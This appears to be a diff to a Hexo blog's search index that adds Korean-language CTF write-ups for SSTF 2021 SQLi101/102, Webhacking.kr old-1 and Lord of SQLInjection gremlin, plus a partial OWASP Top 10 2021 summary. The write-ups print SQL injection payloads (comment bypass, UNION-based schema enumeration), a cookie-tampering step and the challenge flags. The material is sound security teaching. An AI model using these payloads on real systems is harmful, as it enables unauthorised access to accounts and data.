@@ -18,4 +18,608 @@
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
   </entry>
+  <entry>
+    <title>[SSTF 2021] [SQLi101] Write UP</title>
+    <url>/2021/08/17/2021-08-18-SSTF_2021_SQLi101/</url>
+    <content><![CDATA[<h1 id="SQLi101"><a href="#SQLi101" class="headerlink" title="SQLi101"></a>SQLi101</h1><br>
+
+<img src = "/assets/images/SSTF 2021/SQLi101/SQLi101_1.png" weight="400px" height="400px">
+
+<img src = "/assets/images/SSTF 2021/SQLi101/SQLi101_2.png" weight="400px" height="400px">
+
+<br>
+
+<p>해당 문제는 <code>Tutorial</code>에 있는 <code>SQL injection</code>문제입니다.</p>
+<br>
+
+<br>
+
+<img src = "/assets/images/SSTF 2021/SQLi101/SQLi101_3.png" weight="400px" height="400px">
+
+<br>
+
+<p>문제 페이지에 들어가면 위 사진과 같이 <code>php</code>로 만들어진 로그인 페이지가 보입니다.</p>
+<br>
+
+<blockquote>
+<p>Mission: login as an admin using SQL Injection</p>
+</blockquote>
+<p>SQL Injection을 사용하여 <code>admin</code>으로 로그인을 하라고 알려줍니다.</p>
+<br>
+
+<br>
+
+<br>
+
+<img src = "/assets/images/SSTF 2021/SQLi101/SQLi101_4.png" weight="400px" height="400px">
+
+<br>
+
+<p><code>USERNAME</code>에 <code>admin</code>을 입력해주고 <code>PASSWORD</code>에 <code>1&#39;or&#39;1&#39;=&#39;1</code>을 입력했습니다.</p>
+<br>
+
+<blockquote>
+<p>Fail: Don’t use ‘OR’! NO Hack!!</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#Hint <span class="operator">-</span> <span class="keyword">SQL</span> query</span><br><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;&#123;$_GET[&quot;id&quot;]&#125;&#x27;</span> <span class="keyword">and</span> pw<span class="operator">=</span><span class="string">&#x27;&#123;$_GET[&quot;pw&quot;]&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><code>OR</code>을 사용하지 말라는 문구와 힌트가 나왔습니다.</p>
+<br>
+
+<br>
+
+<hr>
+<br>
+
+<h1 id="SOLVE"><a href="#SOLVE" class="headerlink" title="SOLVE"></a>SOLVE</h1><br>
+
+<img src = "/assets/images/SSTF 2021/SQLi101/SQLi101_5.png" weight="400px" height="400px">
+
+<br>
+
+<p><code>USERNAME</code>에 <code>admin&#39;#</code>을 입력해주고 <code>PASSWORD</code>에 <code>아무거나</code>를 입력했습니다.</p>
+<br>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">SQL</span> injection</span><br><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>#<span class="string">&#x27; and pw=&#x27;</span>anything<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>주석을 사용하여 <code>and pw=&#39;anything&#39;</code>조건을 무력화 시켰습니다.</p>
+<br>
+
+<br>
+
+<hr>
+<br>
+
+<h4 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h4><br>
+
+<img src = "/assets/images/SSTF 2021/SQLi101/SQLi101_6.png" weight="400px" height="400px">
+
+<br>
+
+<p>로그인 우회가 되면서 FLAG가 출력되었습니다.</p>
+<br>
+
+<blockquote>
+<p>SCTF{th3_f1rs7_5t3p_t0_the_w3B_h4ckEr}</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>SSTF 2021</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>Write UP</tag>
+        <tag>SSTF 2021</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[SSTF 2021] [SQLi102] Write UP</title>
+    <url>/2021/08/17/2021-08-18-SSTF_2021_SQLi102/</url>
+    <content><![CDATA[<h1 id="SQLi102"><a href="#SQLi102" class="headerlink" title="SQLi102"></a>SQLi102</h1><br>
+
+<img src = "/assets/images/SSTF 2021/SQLi102/SQLi102_1.png" weight="400px" height="400px">
+
+<img src = "/assets/images/SSTF 2021/SQLi102/SQLi102_2.png" weight="400px" height="400px">
+
+<br>
+
+<p>해당 문제는 <code>Tutorial</code>에 있는 <code>SQL injection</code>문제입니다.</p>
+<br>
+
+<br>
+
+<img src = "/assets/images/SSTF 2021/SQLi102/SQLi102_3.png" weight="400px" height="400px">
+
+<br>
+
+<p>문제 페이지에 들어가면 위 사진과 같이 <code>php</code>로 만들어진 검색 페이지가 보입니다.</p>
+<br>
+
+<blockquote>
+<p>Practice: Find a hidden table and get its coumn names.</p>
+</blockquote>
+<p>숨겨진 테이블을 찾고 컬럼의 이름을 얻으라고 써있습니다.</p>
+<br>
+
+<br>
+
+<br>
+
+<img src = "/assets/images/SSTF 2021/SQLi102/SQLi102_4.png" weight="400px" height="400px">
+
+<br>
+
+<p>검색창에 <code>1&#39;or&#39;1&#39;=&#39;1&#39;#</code>을 입력했더니 검색창에 넣은것과는 무관하게 모든 결과가 나왔습니다.</p>
+<br>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">SQL</span> query 추측</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> book <span class="keyword">where</span> title <span class="keyword">like</span> <span class="string">&#x27;%search%&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>위와 같이 query문이 전달된다고 추측했습니다.</p>
+<br>
+
+<br>
+
+<hr>
+<br>
+
+<h1 id="SOLVE"><a href="#SOLVE" class="headerlink" title="SOLVE"></a>SOLVE</h1><br>
+
+<p><code>UNION SQL injection</code>을 사용하여 <code>테이블 이름</code>과 <code>칼럼 이름</code>을 추출해보았습니다.</p>
+<br>
+
+<br>
+
+<p><code>UNION</code>은 둘 이상의 <code>SELECT</code>문 결과를 단일 결과 집합으로 결합해줍니다.</p>
+<br>
+
+<p><code>UNION</code>을 사용하여 결합된 결과 집합은 모두 같은 구조를 가져야 하기 때문에 열의 개수가 같아야 하고 해당 결과 집합 열은 호환되는 데이터 형식을 가져야합니다.</p>
+<br>
+
+<br>
+
+<hr>
+<br>
+
+<h4 id="칼럼-개수-찾기"><a href="#칼럼-개수-찾기" class="headerlink" title="칼럼 개수 찾기"></a>칼럼 개수 찾기</h4><br>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">SELECT</span>문의 칼럼 개수 찾기</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27; order by 1#</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="keyword">or</span><span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">8</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27; order by 9#</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>SELECT문의 컬럼 개수를 찾기 위해 <code>order by</code>절을 사용하여 개수를 찾아보았습니다.</p>
+<br>
+
+<p><code>1&#39;or&#39;1&#39;=&#39;1&#39; order by 8#</code>을 입력했을 때 아래와 같이 검색 결과가 나오는 것을 볼 수 있습니다.</p>
+<br>
+
+<img src = "/assets/images/SSTF 2021/SQLi102/SQLi102_5.png" weight="400px" height="400px">
+
+<br>
+
+<p><code>1&#39;or&#39;1&#39;=&#39;1&#39; order by 9#</code>를 입력했을 때 아래와 같이 검색 결과가 안 나오는 것을 볼 수 있습니다.</p>
+<br>
+
+<img src = "/assets/images/SSTF 2021/SQLi102/SQLi102_6.png" weight="400px" height="400px">
+
+<br>
+
+<br>
+
+<blockquote>
+<p>SELECT문의 컬럼 개수 : 8개</p>
+</blockquote>
+<br>
+
+<br>
+
+<hr>
+<br>
+
+<h4 id="노출되는-데이터가-몇-번째-칼럼인지-확인"><a href="#노출되는-데이터가-몇-번째-칼럼인지-확인" class="headerlink" title="노출되는 데이터가 몇 번째 칼럼인지 확인"></a>노출되는 데이터가 몇 번째 칼럼인지 확인</h4><br>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">null</span>을 이용한 <span class="keyword">UNION</span> 구문</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27; union select null,null,null,null,null,null,null,null#</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><code>null</code>을 이용하여 <code>UNION</code>구문을 실행시켰습니다.</p>
+<br>
+
+<img src = "/assets/images/SSTF 2021/SQLi102/SQLi102_7.png" weight="400px" height="400px">
+
+<br>
+
+<p><code>null</code> 데이터로 아무 값이 출력되지 않는것을 확인할 수 있습니다.</p>
+<br>
+
+<br>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27; union select 1,null,null,null,null,null,null,null#</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">#null에 숫자를 대입하면서 화면에 노출되는 데이터가 몇 번째 칼럼인지 확인</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="keyword">or</span><span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="number">2</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>#</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<img src = "/assets/images/SSTF 2021/SQLi102/SQLi102_8.png" weight="400px" height="400px">
+
+<br>
+
+<p><code>1&#39;or&#39;1&#39;=&#39;1&#39; union select null,2,null,null,null,null,null,null#</code>을 했을 때 2가 노출된 것을 확인할 수 있습니다.</p>
+<br>
+
+<br>
+
+<hr>
+<br>
+
+<h4 id="테이블-이름-추출"><a href="#테이블-이름-추출" class="headerlink" title="테이블 이름 추출"></a>테이블 이름 추출</h4><br>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#테이블 이름 추출</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27; union select null,table_name,null,null,null,null,null,null from information_schema.tables#</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<img src = "/assets/images/SSTF 2021/SQLi102/SQLi102_9.png" weight="400px" height="400px">
+
+<br>
+
+<p>숫자 2가 노출된 위치에 테이블 정보가 노출되도록 스키마 정보를 조회했습니다.</p>
+<br>
+
+<p>조회결과 여러개의 테이블 이름이 나왔는데 그 중에서 findme 테이블의 칼럼이름을 추출해 보겠습니다.</p>
+<br>
+
+<br>
+
+<hr>
+<br>
+
+<h4 id="findme-테이블의-칼럼이름-추출"><a href="#findme-테이블의-칼럼이름-추출" class="headerlink" title="findme 테이블의 칼럼이름 추출"></a>findme 테이블의 칼럼이름 추출</h4><br>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27; union select null,column_name,null,null,null,null,null,null from information_schema.columns where table_name=&#x27;</span>findme<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<img src = "/assets/images/SSTF 2021/SQLi102/SQLi102_10.png" weight="400px" height="400px">
+
+<br>
+
+<p>findme 테이블의 칼럼이름을 추출했더니 FLAG가 나왔습니다.</p>
+<br>
+
+<br>
+
+<hr>
+<br>
+
+<h4 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h4><br>
+
+<blockquote>
+<p>SCTF{b451c_SQLi_5k1lls}</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>SSTF 2021</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>Write UP</tag>
+        <tag>SSTF 2021</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[Webhacking.kr] [old-1] Write UP</title>
+    <url>/2021/08/07/2021-08-07-Webhacking.kr_old_1/</url>
+    <content><![CDATA[<h1 id="전체-소스코드"><a href="#전체-소스코드" class="headerlink" title="전체 소스코드"></a>전체 소스코드</h1><br>
+
+<p>1번 문제를 클릭하면 검은색 화면에 <code>view-source</code>라고 쓰여있습니다.<br>해당 <code>view-source</code>를 클릭해 주면 아래와 같은 전체 소스코드가 나옵니다.</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;../../config.php&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view-source&#x27;</span>] == <span class="number">1</span>)&#123; view_source(); &#125;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>])&#123;</span><br><span class="line">    SetCookie(<span class="string">&quot;user_lv&quot;</span>,<span class="string">&quot;1&quot;</span>,time()+<span class="number">86400</span>*<span class="number">30</span>,<span class="string">&quot;/challenge/web-01/&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;&lt;meta http-equiv=refresh content=0&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Challenge <span class="number">1</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=black&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;font color=white&gt;</span><br><span class="line">---------------------&lt;br&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>(!is_numeric(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>])) <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>]&gt;=<span class="number">4</span>) <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>]&gt;<span class="number">3</span>) solve(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;level : <span class="subst">&#123;$_COOKIE[&#x27;user_lv&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;a href=./?view-source=<span class="number">1</span>&gt;view-source&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p><br><br></p>
+<h1 id="중요-소스코드-해석"><a href="#중요-소스코드-해석" class="headerlink" title="중요 소스코드 해석"></a>중요 소스코드 해석</h1><br>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>(!is_numeric(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>])) <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>]&gt;=<span class="number">4</span>) <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>]&gt;<span class="number">3</span>) solve(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;level : <span class="subst">&#123;$_COOKIE[&#x27;user_lv&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>어떠한 조건에 맞으면 <code>solve(1)</code> 함수를 실행시키는 것을 볼 수 있습니다.<br><br></p>
+<hr>
+<h4 id="두번째-줄-해석"><a href="#두번째-줄-해석" class="headerlink" title="두번째 줄 해석"></a>두번째 줄 해석</h4><p>만약 <code>user_lv</code>쿠키가 숫자가 아니면 <code>user_lv</code>쿠키의 값을 <code>1</code>로 만들어 주는 코드 입니다.</p>
+<p><code>is_numeric</code>함수는 변수가 숫자인지 아닌지 확인하는 함수입니다.</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>])) <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>]=<span class="number">1</span>; <span class="comment">#user_lv 쿠키가 숫자가 아니면 user_lv 쿠키의 값을 1로 만듦.</span></span><br></pre></td></tr></table></figure>
+<p><br><br></p>
+<hr>
+<h4 id="세번째-줄-해석"><a href="#세번째-줄-해석" class="headerlink" title="세번째 줄 해석"></a>세번째 줄 해석</h4><p>만약 <code>user_lv</code>쿠키의 값이 <code>4</code> 이상이면 <code>user_lv</code>쿠키의 값을 <code>1</code>로 만들어 주는 코드 입니다.</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>]&gt;=<span class="number">4</span>) <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>]=<span class="number">1</span>; <span class="comment">#user_lv 쿠키의 값이 4 이상이면 user_lv 쿠키의 값을 1로 만듦.</span></span><br></pre></td></tr></table></figure>
+<p><br><br></p>
+<hr>
+<h4 id="네번째-줄-해석"><a href="#네번째-줄-해석" class="headerlink" title="네번째 줄 해석"></a>네번째 줄 해석</h4><p>만약 <code>user_lv</code>쿠키의 값이 <code>3</code>을 초과하면 <code>solve(1)</code>함수를 실행시켜주는 코드 입니다.</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_lv&#x27;</span>]&gt;<span class="number">3</span>) solve(<span class="number">1</span>); <span class="comment">#user_lv 쿠키의 값이 3을 초과하면 solve(1)함수 실행.</span></span><br></pre></td></tr></table></figure>
+<p><br><br></p>
+<blockquote>
+<p><strong>3개의 조건문을 합쳐보면 <code>user_lv</code>쿠키는 <code>숫자</code>이고, 값이 <code>3보다 크고 4미만</code>이여야 합니다.</strong></p>
+</blockquote>
+<p><br><br></p>
+<h1 id="쿠키-변조"><a href="#쿠키-변조" class="headerlink" title="쿠키 변조"></a>쿠키 변조</h1><br>
+
+<p>쿠키 변조 프로그램은 크롬의 확장 프로그램인 <code>EditThisCookie</code>를 사용했습니다.<br><br><br></p>
+<img src = "/assets/images/Webhacking.kr/old-1/EditThisCookie.png" weight="400px" height="400px">
+<br><br>
+이렇게 `3보다 크고 4미만인 실수`를 넣어준 후 페이지를 새로고침을 해주면 해당 문제가 풀립니다.
+
+]]></content>
+      <categories>
+        <category>Webhacking.kr</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>Write UP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[Lord of SQLInjection] [1번_gremlin] Write UP</title>
+    <url>/2021/09/15/2021-09-15-Lord_of_SQLIjection_1_gremlin/</url>
+    <content><![CDATA[<h1 id="전체-소스코드"><a href="#전체-소스코드" class="headerlink" title="전체 소스코드"></a>전체 소스코드</h1><br>
+
+<p>1번 문제인 gremlin을 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
+<br>
+
+<img src="/assets/images/Lord of SQLInjection/gremlin/source.png">
+
+<br>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  <span class="variable">$db</span> = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); <span class="comment">// do not try to attack another table, database!</span></span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_gremlin where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) solve(<span class="string">&quot;gremlin&quot;</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><br><br></p>
+<h1 id="중요-소스코드-해석"><a href="#중요-소스코드-해석" class="headerlink" title="중요 소스코드 해석"></a>중요 소스코드 해석</h1><br>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); <span class="comment">// do not try to attack another table, database!</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_gremlin where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>일단 <code>조건문</code>과 밑에 <code>query문</code>이 보입니다. </p>
+<br>
+
+<hr>
+<h4 id="첫번째-줄-해석"><a href="#첫번째-줄-해석" class="headerlink" title="첫번째 줄 해석"></a>첫번째 줄 해석</h4><p><code>preg_match</code>라는 함수가 있습니다.</p>
+<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
+<p><code>prob</code>문자열과 특수문자 <code>_</code> <code>.</code> <code>()</code> 를 필터링 하고있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); <span class="comment">//id 파라미터에서 필터링 중</span></span><br></pre></td></tr></table></figure>
+<br>
+
+<img src="/assets/images/Lord of SQLInjection/gremlin/preg.png">
+
+<br>
+
+<br>
+
+<hr>
+<h4 id="두번째-줄-해석"><a href="#두번째-줄-해석" class="headerlink" title="두번째 줄 해석"></a>두번째 줄 해석</h4><p>첫번째 줄과 마찬가지로 필터링 하는 것을 확인할 수 있습니다.</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); <span class="comment">//pw 파라미터에서 필터링 중</span></span><br></pre></td></tr></table></figure>
+<p><br><br></p>
+<hr>
+<h4 id="세번째-줄-해석"><a href="#세번째-줄-해석" class="headerlink" title="세번째 줄 해석"></a>세번째 줄 해석</h4><p>세번째 줄은 쿼리문입니다.</p>
+<p><code>id</code>와 <code>pw</code> 둘 중 하나를 참으로 만들어주면 해당 쿼리문을 우회할 수 있습니다.</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_gremlin where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p><br><br></p>
+<h1 id="SOLVE"><a href="#SOLVE" class="headerlink" title="SOLVE"></a>SOLVE</h1><br>
+
+<p><code>id</code> 부분에 아무 문자를 넣고 <code>pw</code> 부분을 참으로 만들었습니다.<br><br><br></p>
+<img src = "/assets/images/Lord of SQLInjection/gremlin/solved.png">
+<br><br>
+
+<p><strong>SOLVED !!!</strong></p>
+]]></content>
+      <categories>
+        <category>Lord of SQLInjection</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>Write UP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>OWASP TOP 10 2021</title>
+    <url>/2021/09/14/2021-09-14-OWASP_TOP_10_2021/</url>
+    <content><![CDATA[<h1 id="OWASP"><a href="#OWASP" class="headerlink" title="OWASP"></a>OWASP</h1><br>
+
+<p>OWASP(The Open Web Application Security Project)는 오픈소스 웹 애플리케이션 보안 프로젝트입니다.</p>
+<br>
+
+<p>주로 웹에 관한 정보노출, 악성 파일 및 스크립트, 보안 취약점 등을 연구하며, 10대 웹 애플리케이션의 취약점을 발표합니다.</p>
+<br>
+
+<p><code>OWASP TOP 10</code>은 웹 애플리케이션 취약점 중에서 빈도가 많이 발생하고, 보안상 영향을 크게 줄 수 있는 것들 10가지를 선정하여 <code>2004년</code>, <code>2007년</code>, <code>2010년</code>, <code>2013년</code>, <code>2017년</code> 기준으로 발표되었습니다.</p>
+<p><u>최근에</u> <code>2021년</code> <u>버전이 새로 나왔습니다.</u></p>
+<br>
+
+<br>
+
+<hr>
+<br>
+
+<h1 id="OWASP-TOP-10-2017-amp-2021"><a href="#OWASP-TOP-10-2017-amp-2021" class="headerlink" title="OWASP TOP 10_2017 &amp; 2021"></a>OWASP TOP 10_2017 &amp; 2021</h1><br>
+
+<table>
+<thead>
+<tr>
+<th>OWASP TOP 10 (2017)</th>
+<th>OWASP TOP 10 (2021)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>A1. Injection <br />       (인젝션)</td>
+<td>A1. Broken Access Control <br />       (취약한 접근 통제)</td>
+</tr>
+<tr>
+<td>A2. Broken Authentication <br />       (취약한 인증)</td>
+<td>A2. Cryptographic Failures <br />       (암호화 실패)</td>
+</tr>
+<tr>
+<td>A3. Sensitive Data Exposure <br />       (민감한 데이터 노출)</td>
+<td>A3. Injection <br />       (인젝션)</td>
+</tr>
+<tr>
+<td>A4. XML External Entities <br />       (XXE)</td>
+<td>A4. Insecure Design <br />       (안전하지 않은 설계)</td>
+</tr>
+<tr>
+<td>A5. Broken Access Control <br />       (취약한 접근 통제)</td>
+<td>A5. Security Misconfiguration <br />       (잘못된 보안 구성)</td>
+</tr>
+<tr>
+<td>A6. Security Misconfiguration <br />       (잘못된 보안 구성)</td>
+<td>A6. Vulnerable and Outdated Components <br />       (취약점 및 오래된 구성 요소)</td>
+</tr>
+<tr>
+<td>A7. Cross-Site Scripting <br />       (XSS)</td>
+<td>A7. Identification and Authentication Failures <br />       (식별 및 인증 실패)</td>
+</tr>
+<tr>
+<td>A8. Insecure Deserialization <br />       (안전하지 않은 역직렬화)</td>
+<td>A8. Software and Data Integrity Failures <br />       (소프트웨어 및 데이터 무결성 오류)</td>
+</tr>
+<tr>
+<td>A9. Using Components with Known Vulnerabilities<br />       (알려진 취약점이 있는 구성요소 사용)</td>
+<td>A9. Security Logging and Monitoring Failures <br />       (보안 로깅 및 모니터링 실패)</td>
+</tr>
+<tr>
+<td>A10. Insufficient Logging &amp; Monitoring <br />       (불충분한 로깅 및 모니터링)</td>
+<td>A10. Server-Side Request Forgery <br />       (서버 측 요청 위조)</td>
+</tr>
+</tbody></table>
+<br>
+
+<br>
+
+<hr>
+<br>
+
+<h1 id="달라진-점"><a href="#달라진-점" class="headerlink" title="달라진 점"></a>달라진 점</h1><br>
+
